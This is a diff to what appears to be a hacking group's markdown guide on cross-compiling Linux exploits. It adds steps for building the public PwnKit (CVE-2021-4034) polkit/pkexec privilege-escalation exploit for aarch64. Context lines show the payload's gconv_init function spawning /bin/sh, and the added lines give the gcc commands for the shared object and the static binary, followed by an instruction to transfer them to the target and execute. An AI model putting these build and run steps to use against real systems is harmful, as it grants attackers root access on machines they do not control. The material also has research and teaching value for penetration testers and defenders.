@@ -71,6 +71,14 @@ Some exploits can not be compiled statically.
 
 For example exploits that compile .so dynamic shared object files that need to be loaded by the vulnerable program. It is not possible to cross-compile them either as the .so files heavily depend on the ABI of the target system.
 
+### Using aarch64 or armv6
+
+The assumption is that we can not compile on the target system. To compile we use a system with the same architecture and where the Linux flavour is as close as possible to the target system.
+
+AWS has a good selection of Ubuntu, Red Hat, SuSE and Debian flavours and it is free to spin up a ARM64 (aarch64) t2.nano instance and compile an exploit. We also have a lab with various other architectures and flavours. That's what we do.
+
+### Compiling [CVE-2021-4034] for aarch64
+
 A good example is [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034/) also known as polkit/pkexec exploit. The exploit compiles more source during runtime _and_ requires the vulnerable program to load the just compiled .so file.
 
 There are better exploits around but for what we like to showcase the reference exploit [cve-2021-4043-poc.c](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c) is just perfect.
@@ -107,3 +115,13 @@ void gconv_init() {
 	system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
 }
 ```
+
+Compile both source files:
+```shell
+gcc pwnkit.c -o pwnkit.so -shared -fPIC
+gcc thc-polkit.c -o thc-polkit -static
+```
+
+Transfer to the target system and execute:
+```console
+$ ./thc-polkit
